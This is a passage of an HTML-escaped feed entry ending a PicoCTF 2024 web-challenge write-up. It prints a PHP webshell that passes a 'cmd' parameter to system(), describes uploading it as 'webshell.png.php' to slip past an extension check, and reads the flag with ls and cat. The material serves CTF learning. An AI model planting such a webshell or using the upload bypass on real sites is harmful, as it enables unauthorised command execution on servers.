class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-inline z-form z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-inline z-form z-html&quot;&gt;input&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;type&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;TEXT&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;name&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;cmd&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;autofocus&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-attribute-with-value z-id z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-id z-html&quot;&gt;id&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-id z-html&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;size&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;80&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-inline z-form z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-inline z-form z-html&quot;&gt;input&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;type&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;SUBMIT&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;value&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;Execute&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-form z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-form z-html&quot;&gt;form&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;pre&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-php&quot;&gt;if&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-construct z-php&quot;&gt;isset&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_GET&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;    &lt;span class=&quot;z-punctuation z-section z-block z-begin z-php&quot;&gt;{&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-exec z-php&quot;&gt;system&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_GET&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-string z-php&quot;&gt;.&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;2&amp;gt;&amp;amp;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;    &lt;span class=&quot;z-punctuation z-section z-block z-end z-php&quot;&gt;}&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;pre&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-structure z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-structure z-any z-html&quot;&gt;body&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-structure z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-structure z-any z-html&quot;&gt;html&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Along with that, I’ll add the &lt;code&gt;.png&lt;&#x2F;code&gt; extension, saving it as &lt;code&gt;webshell.png.php&lt;&#x2F;code&gt;
+so it passes the extension check. Let’s try uploading this. The form accepted it
+without any complaints! Time to try accessing this webshell under
+&lt;code&gt;&#x2F;uploads&#x2F;webshell.png.php&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;We’re in. Let’s try running &lt;code&gt;ls ..&#x2F;&lt;&#x2F;code&gt; to see the root directory. There’s a weird
+file with the name &lt;code&gt;MQZWCYZWGI2WE.txt&lt;&#x2F;code&gt;. A simple &lt;code&gt;cat&lt;&#x2F;code&gt; on this file finally
+gives us the flag we’re looking for!&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;afterwords&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#afterwords&quot; aria-label=&quot;Anchor link for: afterwords&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+Afterwords&lt;&#x2F;h1&gt;
+&lt;p&gt;The final challenge of this category - titled “elements”, honestly deserves a
+post of its own. It’s of another level, and I’ve never seen myself so stuck on
+one. With that being said, that’s practically all the solvable web challenges
+for PicoCTF 2024 as of writing this post. Thank you all for reading through to
+the end!&lt;&#x2F;p&gt;
+</content>
+        </entry>
+</feed>
